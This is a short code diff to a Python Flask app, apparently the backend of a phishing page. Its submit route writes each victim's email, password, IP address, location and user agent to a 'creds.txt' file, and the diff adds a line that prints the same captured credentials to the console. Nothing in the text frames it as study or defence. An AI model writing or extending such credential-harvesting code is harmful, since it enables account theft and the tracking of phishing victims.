@@ -44,6 +44,7 @@ def submit():
     # Save to file
     with open("creds.txt", "a") as f:
         f.write(f"{datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
+    print(f"[LOG] {datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
     return render_template('submit.html', email=email)
 
 if __name__ == '__main__':
